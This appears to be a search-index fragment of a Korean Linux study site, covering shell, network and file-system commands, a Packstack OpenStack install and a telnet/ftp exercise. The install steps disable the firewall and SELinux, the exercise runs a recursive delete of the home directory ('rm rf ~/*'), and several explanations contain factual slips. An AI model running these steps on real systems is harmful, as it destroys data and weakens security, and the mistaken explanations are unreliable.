주어진 조건의 파일을 찾아 해당 경로를 표시한다.       locate  파일 위치를 찾는 명령어이다.       텍스트 파일 관련 명령어   cat  파일의 내용을 출력하는 명령어이다.       head  파일의 앞부분을 지정한 만큼 출력하는 명령어이다.       tail  파일의 마지막 행을 기준으로 지정한 행까지의 파일 내용 일부를 출력하는 명령어이다.       more   파일을 확인하는 명령어로 파일을 읽어 화면에 화면 단위로 끊어서 출력하는 명령어이다.\n  위에서 아래 방향으로만 출력되기 때문에 지나간 내용을 다시 볼 수 없다.\n       less   텍스트 파일을 한 번에 한 화면씩 나타내는 명령어이다.\n  기능적으로 more를 확장한 것으로 커서를 파일의 상하좌우로 이동할 수 있다.\n       grep  파일에서 특정한 패턴 또는 정규 문자식으로 나타낸 단어를 찾는 명령어이다.       wc  파일의 라인 수, 단어 수, 알파벳 수를 알려주는 명령어이다.       sort  명령어 결과나 문서 내용을 정렬하는 명령어이다.       cut  파일에서 특정 필드를 추출해 낸다. 필드는 구분자로 구분할 수 있다.       split   하나의 파일을 여러 개의 작은 파일로 분리할 때 사용한다.\n  파일의 내용을 라인 수로 분할할 수도 있고, 용량 단위로 분할할 수도 있다.\n  주로 디스켓에 파일을 나누어 복사하거나 백업할 때 CD-RW 용량 단위로 분할할 경우 유용하다.\n       파일 비교 명령어   diff   두 개의 파일을 행 단위로 비교하여 다른 부분을 출력하는 명령어이다.\n  두 개의 파일명을 매개변수로 사용하여 화면에 차이점을 나열한다.\n       cmp  두 개의 파일을 바이트 단위로 비교하여 출력하는 명령어이다.       comm  두 개의 파일의 행과 행을 비교하여 출력하는 명령어이다.       리다이렉션과 정규 표현식   리다이렉션   표준 입력과 표준 출력의 방향을 재지정하는 것이다.\n  표준 입력/출력/에러가 화면이 아닌 파일로 대체한다. 즉, 모니터로 출력이 파일로 재지정한다.\n  표준 입력 장치는 키보드, 표준 출력 장치는 모니터, 표준 에러 장치는 모니터이다.\n        파이프   둘 이상의 명령을 함께 묶어 출력 결과를 다른 프로그램이 입력으로 전환하는 기능이다.\n  현재 명령의 표준 출력을 다음 명령의 표준 입력으로 사용하는 것이다.\n  명령어와 명령어의 연결은 | 기호를 사용한다.\n  명령어1의 출력 결과는 명령어2의 입력으로 처리된다.\n  더 이상 처리할 명령어가 없으면 표준 출력 장치인 화면으로 출력한다.\n       정규표현식     기호 의미     ^ 라인의 첫 글자   $ 라인의 끝 글자   . 한 글자       | 기호 바로 이전의 글자는 정규 표현식이 0회 이상 반복 | 대체 글자 목록을 에 나열 [^] | 대체 못할 글자 목록을 [^] 에 나열       | 기호 바로 이전 글자나 정규 표현식이 1회 이상 반복 ? ? | 기호 바로 이전 글자나 정규 표현식이 없거나 1회만 존재 ( ) | 부분 정규 표현식의 시작과 끝을 표시 | | | 로 구분된 단어들 중 최소 하나 존재 {m, n} | { } 기호 바로 이전 글자나 정규 표현식이 m개 이상 n개 이하 반복       기타 명령어  네트워크 관련 명령어   ping  외부 호스트에 신호를 보내며 신호를 받은 호스트는 응답을 주면서 서로 네트워크가 연결되어 있음을 확인시켜주는 명령어이다.       traceroute   목적지 호스트까지의 경로를 표시하고 그 구간의 정보를 기록하는 명령어이다.\n  목적지 호스트까지의 패킷 전송 지역을 측정하거나 목적지 호스트로 향하는 경로상에 어떤 장애가 있는 경우 위치를 파악할 수 있다.\n       nslookup  도메인명으로 IP 주소를 조회하거나 또는 IP 주소로 도메인명을 조회하는 명령어이다.       dig   명령어 nslookup 과 유사한 기능을 가진 명령어로 호스트명에 대한 IP 주소 정보 또는 IP주소에 대한 호스트명을 조회하는 명령어이다.\n  서버명은 확인하고자 할 네임 서버를 지정하는 것이며 지정하지 않을 경우 /etc/resolv 에 등록된 네임 서버를 이용하여 루트 서버를 조회하게 된다.\n       host   호스트명을 알고 있는데 IP 주소를 모르거나 그 반대의 경우에 사용하는 명령어이다.\n  호스트명을 이요하면 IP 주소뿐만 아니라 하위 호스트명도 조회할 수 있다.\n  호스트는 시스템에 등록된 DSN 서버를 이용하여 검색하는데 다른 DNS 서버를 이용해서 따로 지정할 수 있다.\n       hostname  시스템 이름을 확인하거나 변경할 때 사용하는 명령어이다.       시스템 종료 명령어   shutdown   시스템을 종료하거나 재부팅하는 명령어이다.\n  현재 수행 중인 프로세스들을 종료하며 sync 를 수행하여 저장되지 않는 데이터를 디스크에 저장하고 모든 파일 시스템을 mount 시킨 후에 시스템을 종료한다.\n  root 사용자만이 권한을 가지고 있는 명령어이다.\n       init  shutdown 명령어 동일한 기능을 가진 명령어이다.       reboot  시스템을 재부팅하는 명령어이다.       halt  시스템을 종료하는 명령어이다.       기타 명령어    cal  시스템에 설정된 달력을 출력하는 명령어이다.       date  시스템의 날짜와 시간을 표시하거나 변경한다.       clear  터미널의 내용을 지우는 명령어이다.       tty   현재 사용하고 있는 단말기 장치의 경로명과 파일명을 나타낸다.\n  텔넷 등에서 동일한 계정으로 여러 개 로그인한 경우 확인 시 유용하다.\n       time   프로그램이 수행되는데 걸리는 시간을 측정하여 출력하는 명령어이다.\n  세 가지 시간 결과 real, user, sys를 보여준다. real 을 총 수행시간, user 는 CPU가 사용자 영역에서 보낸 시간, sys 는 시스템 호출 실행에 걸린 시간이다.\n       wall  모든 로그인된 사용자들에게 터미널을 통해 메시지를 전달받는 명령어이다.       write  해당 사용자에게 메시지를 전달하는 명령어이다.       mesg  write 를 사용해서 들어오는 메시지 수신 여부를 확인하고 제어하는 명령어이다      "}),a.add({id:239,href:'/docs/openstack/openstacktraining/packstack/',title:"Packstack",content:"Packstack Stein 설치  Packstack   Redhat 계열 ( ex : CentOS )의 OpenStack 자동화 설치 툴     Packstack stain 설치   기본적으로 PackStack은 올인원 or 다중노드로 구성할 수 있으며, 여기서는 올인원으로 설치를 진행하며, 다중노드에 대한 설정은 추가하도록 하겠습니다.   설치사양     OS CPU RAM DISK     CenOS7 4/ 2 10240 100G      만약 다중 노드에 경우 소스를 분산시키고 각 노드에 설정을 추가합니다.  hosts, hostname 등록 및 설정 다중 노드의 경우 controller node에서 다른 노드의 ssh 접속을 위한 키를 등록시킵니다.    $ controller\u0026gt; $ ssh-keygen $ controller\u0026gt; $ ssh-copy-id network $ controller\u0026gt; $ ssh-copy-id compute $ controller\u0026gt; $ ssh-copy-id ... 다른 노드    설치 순서   firewalld 설정 setenforce을 진행합니다.  $ systemctl stop firewalld $ systemctl disable firewalld $ systemctl stop NetworkManagaer $ systemctl disable NetworkManagaer # 방화벽 및 네트워크 매니저 설정을 진행합니다. $ setenforce 0 $ sed -i \u0026#39;s/=enforcing/=disabled/g\u0026#39; /etc/sysconfig/selinux # setenforce 설정을 진행합니다.     OpenStack stain release를 등록합니다.  $ yum -y update # 기본 패키지를 업데이트 합니다. $ yum install -y centos-release-openstack-stein $ yum -y update # stein 레포지터리를 등록 후, 다시 업데이트를 진행합니다.     올인원의 경우  $ yum install -y openstack-packstack $ packstack --allinone # packstack을 통해 OpenStack 설치를 진행합니다.     다중노드의 경우  $ packstack --gen-answer-file=/root/stein-answer.txt # Packstack 설정 파일을 설치합니다. $ vi /root/stein.answer.txt CONFIG_CONTROLLER_HOST=contoller CONFIG_COMPUTE_HOSTS=compute1,compute2,compute3.... CONFIG_NETWORK_HOSTS=network1,network2.... CONFIG_PROVISION_DEMO=n CONFIG_NTP_SERVERS=0.centos.pool.ntp.org iburst, 1.centos.pool.ntp.org iburst, 2.centos.pool.ntp.org iburst, 3.centos.pool.ntp.org iburst CONFIG_CINDER_VOLUMES_SIZE=100G # 기본적인 설정을 진행합니다. # 설치 시 각 OpenStack의 서비스들을 원하는 Node의 설치할 수 있습니다. $ packstack --answer-file=/root/stein-answer.txt # packstack 설치를 진행합니다.     접속 IP, PW 확인  $ /var/tmp/packstack/....../openstack-setup.log | cat USERNAME= $ /var/tmp/packstack/....../openstack-setup.log | cat ADMIN_PW= # 사용자 이름 및 암호 출력   "}),a.add({id:240,href:'/docs/system/linux/ls01/',title:"이용 기술",content:"Linux Server Management*   telnet, vi, ftp 사용연습  ftp 서버    CentOS7 : L1(192.168.10.50)\n  CentOS7 : L2(192.168.10.51)\n  $ L1\u0026gt; vi /etc/hostname ... ... L1 $ L1\u0026gt; vi/etc/hosts ... ... 192.168.10.50 L1 192.168.10.51 L2 $ L1\u0026gt; scp /etc/hosts L2:/etc/hosts $ L1\u0026gt; init 6 $ L2\u0026gt; vi/etc/hostname ... ... L2 $ L2\u0026gt; init 6 # 설정 $ L2\u0026gt; touch apple banana peach $ L2\u0026gt; tar -cvf fruit apple banana peach $ L2\u0026gt; ll -rw-r--r--. 1 root root 0 Dec 13 02:55 apple -rw-r--r--. 1 root root 0 Dec 13 02:55 banana -rw-r--r--. 1 root root 10240 Dec 13 02:56 fruit -rw-r--r--. 1 root root 0 Dec 13 02:55 peach $ L2\u0026gt; ftp L1 ... $ ftp\u0026gt; binary $ ftp\u0026gt; put fruit local: fruit remote: fruit 227 Entering Passive Mode (192,168,10,50,161,127). 150 Ok to send data. 226 Transfer complete. 10240 bytes sent in 0.000277 secs (36967.51 Kbytes/sec) $ ftp\u0026gt; exit # fruit를 put(push) $ L1\u0026gt; ls -a /home/test1/ -rw-r--r--. 1 test1 test1 10240 Dec 13 02:59 fruit $ L1\u0026gt; tar -xvf /home/test1/fruit $ L1\u0026gt; ls -a /home/test1/ -rw-r--r--. 1 root root 0 Dec 13 02:55 apple -rw-r--r--. 1 root root 0 Dec 13 02:55 banana -rw-r--r--. 1 test1 test1 10240 Dec 13 02:59 fruit -rw-r--r--. 1 root root 0 Dec 13 02:55 peach # fruit의 압축해제 및 확인이 가능   ftp 커맨드 목록     커맨드 의미     o(pen) ftp 서버에 접속   user 사용자 이름/ 암호 입력   bye, exit ftp 종료   cl(ose) ftp 서버와 접속 종료   lcd 폴더 이동   cd 디렉터리 이동   ls 현재 디렉리의 파일 목록 표시   mkdir 디렉터리 생성   delete 파일 삭제   rename 파일 이름 갱신   pwd 현재 작업 디렉터리 이름 표시   ascii 전송할 파일이 문자형임을 선언   binary 전송할 파일이 바이너리임을 선언   prompt mput/mget에서 파일 전송 시 질문 여부   put 파일 전송   mput 여러 파일을 전송   send put과 동일   get 파일 다운로드   mget 여러 파일 다운로드   recv get과 동일   reget 파일 전송 도중에 종료한 파일을 이어 받음   help 도움말   ! 로컬 명령을 실행        연습문제  # 1. telnet으로 로그인 후 홈 디렉터리 안의 필요없는 디렉터리와 파일을 삭제 $ L2 \u0026gt; telnet L1 L1 login : test1 password : $ test1@L1\u0026gt; rm rf ~/* # 2. 작업용 디렉터리를 만들고 그 안으로 이동 $ test1@L1\u0026gt; mkdir ~/task $ test1@L1\u0026gt; cd ~/task # 3. /home/user1/exam/sendmail.def.original을 복사해서 이 파일을 sendmail.def로 이름을 변경 $ test1@L1\u0026gt; cp -p /home/user1/exam/sendmail.def.original sendmail.def # 4. 이 파일을 다음과 같은 요령으로 /hme/user1/exam/sendmail.def와 같은 내용으로 편집 # 2,1을 비교한 결과를 파일로 출력 # 생성된 파일 diff.lst를 ftp를 이용해 PC로 가져와 메모장에서 연다 # 이를 보면서 telnet으로 파일1을 vi로 편집 # 편ㄵ비이 끝나면 diff로 다시 비교해서 차이가 없으면 성공 $ test1@L1\u0026gt; diff sendmaill.def /home/user1/exam/sendmail.def.original \u0026gt; ~/diff.lst $ test1@L1\u0026gt; exit $ L2\u0026gt; ftp L1 ... ... $ ftp\u0026gt; get diff.lst $ ftp\u0026gt; logout $ L2\u0026gt; vi ~/diff.lst $ 푸티를 하나 더 실행후 \u0026gt; telnet L1 ... ... $ L2\u0026gt; telnet L1 $ test1@L1\u0026gt; vi ~/sendmail.def # 수정 후 저장 $ diff sendmaill.def /home/user1/exam/sendmail.def.original   "}),a.add({id:241,href:'/docs/system/linux/lm-2/',title:"Linux 운영 및 관리",content:"리눅스 일반   권한 및 그룹 설정  리눅스 시스템은 모든 파일과 디렉터리에는 접근권한과 소유권이 부여된다. 명령어 ‘ls –l’ 은 파일 속성을 나타낸다. 속성 필드 중 첫 번째 필드는 파일이나 디렉터리의 허가권, 세번째와 네번째 필드는 파일이나 디렉터리의 소유권을 나타낸다. 파일의 허가권이나 소유권을 설정하는 명령어는 chmod, chown, chgrp, umask 등이 있다.    소유권 관련 명령어  소유권은 임의의 파일 또는 디렉터리에 대한 사용자와 그룹들의 소유 권한을 나타낸 것이다. 그룹은 사용자들의 시스템 운영 특성에 따라 묶어 놓은 것으로, 같은 그룹에 속한 사용자들은 파일 또는 디렉터리에 대해 동일한 소유권과 직접 권한을 갖는다.     chown  파일과 디렉터리의 사용자 소유권과 그룹 소유권을 변경한다.       chgrp  파일이나 디렉터리의 그룹 소유권을 변경한다.       허가권 관련 명령어   명령어 ‘ls –l’ 으로 파일 유형과 허가권을 알 수 있다.\n  파일 허가권의 처 번째 자리는 파일 유형을 기호로 정의한다.\n  파일은 일반 파일, 디렉터리 파일, 특수 파일로 나뉜다.\n  파일 권한을 읽기(read), 쓰기(write), 실행(execute)이 있다.\n  읽기, 쓰기 또는 실행의 접근 제한 표시는 하이픈(-) 으로 나타낸다.\n       chmod  파일이나 디렉터리의 접근 허가권을 변경하는 명령어이다.       umask   새로 생성되는 파일이나 디렉터리의 기본 허가권 값을 지정한다.\n  파일의 기본 권한은 666, 디렉터리의 기본 권한은 777 이다.\n  파일이나 디렉터리 생성 시 디폴트 권한 값에서 설정한 umask 를 뺀 값을 기본 허가권으로 설정한다.\n       특수 권한   SetUID 와 SetGID   프로세스가 실행되는 동안 해당 프로세스의 root 권한을 임시로 가져오는 기능이다.\n  프로세스가 사용자보다 높은 수준의 접근을 요구할 때 파일 접근 제한 때문에 원활한 기능을 제공할 수 없기 때문에 이러한 문제점을 해결하기 위한 방법이다.\n  SetUID의 경우 사용자가 사용할 때만 소유자 권한으로 파일을 실행시키고, SetGID 의 경우 사용자가 사용할 때만 그룹 권한으로 파일을 실행한다.\n       Sticky bit   일반적으로 공용 디렉터리를 사용할 때 sticky bit 를 설정하여 사용한다.\n  사용자 권한을 지정하기 어려운 프로그램들이 일시적으로 특정 디렉터리에 파일을 생성하고 삭제하도록 이용된다.\n  설정된 디렉터리에는 누구든 접근 가능하고 파일을 생성할 수 있다.\n  Sticky bit 가 설정되어 있는 디렉터리 안의 내용은 해당 파일의 소유자나 root 만이 변경이 가능하다.\n       디스크 쿼터   파일 시스템마다 사용자나 그룹이 생성할 수 있는 파일의 용량 및 개수를 제한하는 것이다. 보통 블록 단위의 용량 제한과 inode의 개수를 제한한다.\n  사용자나 그룹이 가질 수 있는 inode의 수, 사용자나 그룹에게 할당된 디스크 블록 수를 제한한다.\n  쿼터는 사용자별, 파일 시스템별로 동작된다.\n  그룹 단위로도 용량을 제한할 수 있으며 웹호스팅 서비스를 하는 경우에 유용하다.\n     디스크 쿼터 지정 단계   단계 1: 파일 /etc/fstab 에 디스크 쿼터 관련 설정\n  단계 2: 재마운팅 실행 후 확인\n  단계 3: 마운트 된 커터를 끄고 생성된 쿼터 파일 삭제\n  단계 4: 쿼터 데이터베이스 생성\n  단계 5: 사용자별 쿼터 지정\n  단계 6: 쿼터 현재 상태 점검\n     디스크 쿼터 관련 명령어   quotaoff : 쿼터 서비스를 비활성화 한다.\n  quotacheck : 파일 시스템의 디스크 사용 상태를 검색한다.\n  edquota : 편집기를 이용하여 사용자나 그룹에 디스크 사용량을 할당하는 명령어이다.\n  setquota : 편집기가 기반이 아닌 명령행에서 직접 사용자나 그룹에 디스크 사용량을 할당하는 명령어이다.\n     파일 시스템의 관리  파일 시스템의 개요와 종류  개요   운영체제가 파일을 시스템의 디스크상에 구성하는 방식이다.\n  컴퓨터에서 파일이나 자료를 쉽게 발견 및 접근할 수 있도록 보관 또는 조직하는 체제이다.\n  하드디스크나 CD-ROM 과 같은 물리적 저장소를 관리한다.\n  파일 서버상의 자료로의 접근을 제공하는 방식과 가상의 현태로서 접근 수단만이 존재하는 방식도 파일 시스템의 범위에 포함된다.\n      종류  리눅스 전용 디스크 기반 파일 시스템     파일 시스템 설명   ext 리눅스 초기에 사용되던 파일 시스템이며 호환성이 없음\n  ext2의 원형\n  2GByte 의 데이터와 파일명을 255자까지 지정 가능\n  ext2 고용량 디스크 사용을 염두하고 설계된 파일 시스템\n  쉽게 호환되며 업그레이드도 쉽게 설계되어 있음\n  ext3 리눅스의 대표적인 저널링을 지원하도록 확장된 파일 시스템\n  ACL(Access control List) 를 통한 접근 제어 지원\n  ext4 파일에 디스크 할당 시 물리적으로 연속적인 블록을 할당\n  64비트 기억 공간 제한을 없앰\n  16 TeraByte 의 파일을 지원\n  저널링 파일 시스템\n       파일 시스템 설명   JFS Journaling File System 의 약자\n  IBM 사의 독자적인 저널링 파일 시스템\n  GPL로 공개하여 현재 리눅스용으로 개발\n  xfs eXetended File System\n     고성능 저널링 시스템   64비트 주소를 지원하며 확장성이 있는 자료 구조와 알고리즘 사용\n  데이터 읽기/쓰기 트랜잭션으로 성능 저하를 최소화\n  64비트 파일 시스템으로 큰 용량의 파일도 다룰 수 있음\n  ReiserFS 독일의 한스 라이저가 개발한 파일 시스템\n  모든 파일 객체들을 B트리에 저장, 간결한 색인화 된 디렉터리 지원\n     네트워크 파일 시스템  파일 시스템 설명  SMB Server Message Block   삼바 파일 시스템을 마운트 지정\n  윈도우 계열 OS 환경에서 사용되는 파일/프린터 공유 프로토콜\n  리눅스, 유닉스 계정 OS와 윈도우 OS와의 자료 및 하드웨어 공유\n       CIFS Common Internet File System  SMB를 확장한 파일 시스템 SMB를 기초로 응용하여 라우터를 뛰어넘어 연결할 수 있는 프로토콜       NFS Network File System   썬마이크로시스템이 개발한 네트워크 공유 프로토콜\n  파일 공유 및 파일 서버로 사용됨\n  공유된 영역을 마운트할 때 지정\n  하드웨어, 운영체제 또는 네트워크 구조가 달라도 공유 가능\n  NFS 서버의 특정 디렉터리를 마운트하여 사용할 수 있음\n       기타 지원 가능한 파일 시스템   파일 시스템 설명   FAT Windows NT가 지원하는 파일 시스템 중 가장 간단한 시스템\n  FAT 로 포맷된 디스크는 클러스터 단위로 할당\n  클러스터 크기는 볼륨 크기에 따라 결정\n  읽기 전용, 숨김, 시스템 및 보관 파일 특성만 지원\n  삼바 파일 시스템을 마운트 지정\n       VFAT Virtual FAT   FAT 파일 시스템이 확장된 것으로 FAT 보다 제한이 적음\n  파일 이름도 최고 255자까지 만들 수 있음\n  공백이나 여러 개의 구두점도 포함\n  FAT32 SMB를 확장한 파일 시스템\n  32GB 보다 큰 파티션을 만들 수 없고 파티션에 4GB를 초과하는 파일을 저장할 수 없음\n  NTFS 윈도우에서 사용하는 파일 시스템\n  안정성이 뛰어나고 대용량 파일도 저장\n  파일 크기 및 볼륨은 이론상으로 최대 16EB 이나 실질적으로는 2TB로 한계가 있음\n  ISO 9660 CD-ROM 의 표준 파일 시스템\n  1988년에 재정된 표준\n  UDF Universal Disk Format 의 약자로 최신 파일 시스템 형식\n  광학 매체용 파일 시스템 표준\n  ISO 9660파일 시스템을 대체하기 위한 것으로 대부분 DVD에서 사용\n  HPFS OS/2 의 운영체제를 위해 만들어진 파일 시스템\n       파일 시스템 관련 명령어   mount 와 umount   마운트는 특정 디바이스를 특정 디렉터리처럼 사용하기 위해 장치와 디렉터리를 연결한다.\n  리눅스는 PnP 기능을 지원하지만 지원하는 하드웨어가 많지 않으므로 시스템 부팅후에수동으로 마운트해서 사용을 하고 사용이 끝난 후에는 언마운트를 시킨다.\n  파일 /etc/mtab 은 현재 마운트된 블록 시스템 정보를 표시한다.\n       eject  이동식 보조기억장치등과 같은 미디어를 해제하고 장치를 제거하는 명령어이다.       fdisk   새로운 파티션의 생성, 기존 파티션의 삭제, 파티션의 타입 결정 등의 작업을 수행할 수있다.\n  한 번에 한 디스크에 대해서만 작업을 수행한다.\n   mkfs   리눅스 파일 시스템을 생성한다.\n  fdisk로 하드디스크를 파티션을 나눈 후 해당 파티션에 맞는 파일 시스템을 생성한다.\n       mke2fs  ext2, ext3, ext4 타입의 리눅스 파일 시스템을 생성하는 명령어이다.       fsck   파일 시스템의 무결성을 점검하고 대화식으로 복구하는 명령어이다.\n  디렉터리 /lost+found 는 fsck 에서 사용하는 디렉터리이다.\n       e2fsck  ext2, ext3, ext4 타입의 리눅스 파일 시스템을 복구하는 명령어이다.       du  Disk Usage의 약자로 디렉터리별로 디스크 사용량을 확인할 수 있다.       df   시스템에 마운트된 하드 디스크의 남은 용량을 확인할 때 사용하는 명령어이다.\n  기본적으로 1024 Byte 블록 단위로 출력한다.\n      셸 개념 및 종류  개념   명령어 해석기이다.\n  로그인할 때 실행되어 사용자별로 사용 환경 설정을 가능하게 한다.\n  강력한 스크립트 언어이다.\n  입출력 방향 재지정과 파이프 기능을 제공한다.\n  포어/백그라운드 프로세스를 실행한다.\n    종류   본셸계열과 C셸 계열로 나뉜다.\n  사용자 프롬프트가 $ 이면 본셸 계열, % 이면 C 셸 계열을 사용하고 있다는 것이다.\n  대부분의 셸은 본셸 계열의 기능을 포함하여 확대 발전한 형태이다.\n  C셸은 본셸의 모든 기능과 명령어 히스토리, 별명, 작업 제어 기능을 추가로 가지고 있다.\n    셸 확인 및 변경   로그인 셸 확인   파일 /etc/shell 에서 사용할 수 있는 셸들을 확인할 수 있다.\n  파일 /etc/passwd 파일에서 계정마다 할당된 셸을 확인할 수 있다.\n  명령어 echo $SHELL 은 현재 로그인한 사용자가 사용하고 있는 셸을 확인할 수 있다.\n       셸 변경   로그인 셸 변경은 반영구적인 셸 변경 방법으로 관리자가 셸 변경 후 다음 변경을 하기전까지 지정된 셸을 사용한다.\n  명령어 chsh: 일반 사용자 환경에서 셸 변경 시 사용한다.\n  명령어 usermod: 관리자 환경에서 지정된 계정자의 정보를 변경할 때 사용하는 명령어이다.\n       환경 변수와 셸 변수   환경 변수   전체 셸에서 사용 가능한 전역 변수\n  서브 셸에 기능 상속 가능\n  환경 변수 확인 명령 env\n    **셸 환경  셸 변수 (지역 변수)   현재 로그인 셸에서만 사용 가능한 지역 변수\n  서브 셸에 기능 상속 불가능\n  셸 변수 확인 명령 set\n    **셸 환경  환경 설정 파일   셸 시작 시 자동으로 실행되는 고유의 시작 파일이 있다. 이 파일은 사용자 운영환경을 설정한다.\n  배쉬셸의 시작 파일은 /etc/profile, /etc/bashrc, ~/.bash_profile, ~/.bashrc 이다.\n  셸 파일은 전역적 파일과 지역적 파일로 나뉜다.\n  파일 /etc/profile.d 는 몇몇 응용 프로그램들이 시작 시 자동 실행할 스크립트 파일 경로를 넣어둔다.\n       배쉬셸의 주요 기능   History 기능   일정 개수 이상 사용했던 명령어를 .bash_history 에 저장해 두고 다시 불러서 사용할 수 있게 하는 기능이다.\n  대부분의 셸은 이전에 입력했던 명령어를 반복하거나 약간 변형하여 다시 사용할 수 있도록 하는 기능이다.\n       alias 기능  자주 사용하는 명령어를 특정 문자로 입력해 두고 간편하게 사용할 수 있게 하는 기능이다.       프로세스 개념 및 유형   개념   프로세스는 CPU와 메모리를 할당받아 실행 중인 프로그램이다.\n  프로세스들마다 고유의 프로세스 ID를 할당받는다.\n       프로세스의 유형   포어그라운드 프로세스   사용자와 상호작용하는 프로세스\n  터미널에 직접 연결되어 입출력을 주고받는 프로세스\n  명령 입력 후 수행 종료까지 기다려야 하는 프로세스\n  화면에서 실행되는 것이 보이는 프로세스\n  응용프로그램이나 명령어 등\n       백그라운드 프로세스   사용자와 직접적인 대화를 하지 않고 뒤에서 실행되는 프로세스\n  사용자의 입력에 관계없이 실행되는 프로세스\n  실행은 되지만 화면에 나타나지 않고 실행되는 프로세스\n  시스템 프로그램, 데몬 등\n   fork   새로운 프로세스를 만들 때 기존 프로세스를 복제하는 방식을 사용한다.\n  새로운 프로세스를 위한 메모리를 할당한다.\n  새로 생성된 프로세스는 원래의 프로세스와 똑 같은 코드를 가지고 있다.\n  원본 프로세스를 부모 프로세스라 부르고, 새로 복제된 프로세스를 자식 프로세스라고 부른다.\n       exec   호출하는 프로세스가 새로운 프로세스로 변경되는 방식이다.\n  새로운 프로세스를 위한 메모리를 할당하지 않는다.\n  호출한 프로세스의 메모리에 새로운 프로세스의 코드를 덮어씌워 버린다.\n       데몬   리눅스 시스템이 부팅 시 자동으로 실행되는 백그라운드 프로세스이다.\n  메모리에 상주하면서 사용자의 특정 요청이 오면 즉시 실행되는 대기 중인 서버 프로세스이다.\n  주기적이고 지속적인 서비스 요청을 처리하기 위해 사용된다.\n  사용자들은 이 프로세스들을 볼 수 있는 권한이 없다.\n       프로세스 유틸리티  프로세스 관련 명령어   ps   현재 실행중인 프로세스의 상태를 보여주는 명령어이다.\n  CPU사용도가 낮은 순서로 출력된다.\n       pstree  실행 중인 프로세스들을 트리구조로 나타낸다.       jobs  작업이 중지된 상태, 백그라운드로 진행 중인 상태, 변경되었지만 보고되지 않은 상태 등을 표시한다. 백그라운드로 실행중인 프로세스를 확인한다. [숫자] 는 작업번호이다. 출력된 목록에서 +는 현재 작업 실행, -는 앞으로 실행될 작업을 나타낸다.       bg와 fg   포어그라운드에서 백그라운드로 전환: bg %작업번호 또는 bg 작업번호\n  백그라운드에서 포어그라운드로 전환: fg %작업번호 또는 fg 작업번호\n       kill  프로세스를 종료시킨다.       killall   같은 데몬의 여러 프로세서를 한 번에 종료시킬 때 사용한다.\n  프로세스명으로 연관된 프로세스들을 종료시킨다.\n       nice   프로세스 사이의 우선순위를 확인하고 우선순위를 변경할 수 있는 명령어이다.\n  조정할 수 있는 NI 값의 범위는 -20 ~ 19 (우선순위 높음 -\u0026gt; 낮음)이다.\n  우선순위 0의 값을 가지며 값이 작을수록 우선순위가 높다.\n  옵션 –n을 사용하지 않으면 디폴트는 10을 사용한다.\n  조정수치가 생략되면 명령의 우선권은 10만큼 증가한다.\n  명령어 ‘nice -10 bash’ 는 bash 프로세스 NI 값을 10만큼 증가시키는 것이다. 값이 증가한다는 것은 우선순위를 낮추는 것이다. 우선순위를 높이는 명령어는 ‘nice \u0026ndash;10 bash’ 이다. 이것은 NI 값을 -10만큼 감소시켜 우선순위를 높인다.\n  nice [옵션] 프로세스명\n       renice  이미 실행중인 프로세스의 우선순위를 변경한다. nice는 기존 NI값을 증감하지만 명령어 renice는 지정한 NI값을 설정한다. nice는 양수값은 -를, 음수값은 \u0026ndash;를 사용하지만, renice는 양수값에 –를 사용하지 않는다. renice [옵션] NI값 PID       top  리눅스 시스템의 운영 상태를 실시간으로 모니터링하거나 프로세스 상태를 확인할 수 있다.       nohup  프로세스가 중단되지 않고 백그라운드로 작업을 수행할 수 있게 한다. 사용자가 로그아웃하거나 작업 중인 터미널 창이 닫혀도 실행 중인 프로세스를 백그라운드 프로세스로 계속 작업할 수 있도록 한다. 용량이 큰 데이터 압축 해제와 같은 실행 시간이 오래 걸리는 프로세스들에 대해 nohup으로 처리하여 작업하면 작업 중단 없이 해당 업무를 완료할 수 있다. 백그라운드로 실행될 수 있도록 명령행 뒤에 \u0026amp;를 명시한다.       tail  파일의 마지막 행을 기준으로 지정한 행까지 파일 내용의 일부를 출력한다. 기본값으로 마지막 10줄을 출력한다.       스케줄링과 cron  주기적으로 반복되는 일은 자동적으로 실행될 수 있도록 설정한다. 스케줄링 데몬은 crond이며 관련 파일은 /etc/crontab이다. 파일 /etc/crontab은 7개의 필드로 구성되어 있다. 명령어 crontab은 사용자가 주기적인 작업을 등록할 수 있게 한다.       에디터 종류   개요   리눅스에서 지원하는 편집기로는 vi, emacs, pico, gedit, xedit 등이 있다.\n  리눅스 편집기는 편집기를 통해 파일을 수정한다.\n       종류   pico   워싱턴 대학의 Aboil Kasar가 개발한 유닉스 기반의 텍스트 에디터이다.\n  메뉴 선택 방식의 텍스트 편집기로 기본 인터페이스가 윈도우의 메모장과 유사하여 간단하다.\n  자유 소프트웨어 라이선스가 아니기 때문에 소스 수정이 불가능하다.\n  다른 편집기에 비해 사용하기 쉽고 사용하기 편리하지만 기능이 부족하고 업데이트가 잘되지 않는다.\n  GNU프로젝트에서는 pico의 복제 버전 에디너인 nano를 개발하였다.\n  vi편집기처럼 입력모드와 명령모드가 존재하지 않고 바로 텍스트 입력이 가능하다.\n       emacs  리차드 스톨만이 매크로 기능이 있는 텍스트 교정 및 편집기로 개발하였다. 최초의 개발자는 리차드 스톨만이며, 이후 제임스 고슬링이 LISP언어를 기반하여 emacs에 다양한 기능을 개발하여 추가하였다. LISP 에 기반을 둔 환경 설정 언어를 가지고 있다.       vi  1976년 빌 조이가 초기 BSD 릴리즈에 포함될 편집기로 만들었다. 리눅스 배포판과 유닉스에 기본적으로 포함되어 있다. 유닉스 환경에서 가장 많이 쓰이는 문서 편집기이다. 다른 편집기들과 다르게 모드형 편집기이다. 명령모드, 입력모드, 편집모드로 구성되어 있다.       vim  브람 무레나르가 만든 편집기이다. vi 편집기와 호환되면서 독자적으로 다양한 기능을 추가하여 만든 편집기이다. 편집 시 다양한 색상을 이용하여 가시성을 높일 수 있다. 패턴 검색 시 하이라이트 기능을 제공하여 빠른 검색을 가능하게 해준다. ex모드에서 히스토리 기능을 제공한다. 확장된 정규 표현식 문법과 강력한 문법 강조 기능을 갖는다.       gedit  그놈 데스크톱 환경으로 개발된 자유 소프트웨어 텍스트 편집기이다. 마이크로소프트, 윈도, 맥OS X에서도 사용할 수 있다. UTF-8과 호환하며 텍스트 문서를 편집하는 용도에 중점을 두었다. X-윈도우 시스템에 맞춰 개발되었다. GTK+와 그놈 라이브러리를 이용하여 개발되었다. 텔넷 접속 시나 텍스트 기반 콘솔 창에서는 사용할 수 없다.       에디터 활용  에디터 기초 사용법   pico     메뉴 기능     [Ctrl] + [O] 파일 저장   [Ctrl] + [X] 파일 종료, 종료 시 저장이 안 되어 있으면 저장할 것인지 물어봄   [Ctrl] + [R] 현재 커서 위치에 다른 파일을 불러옴   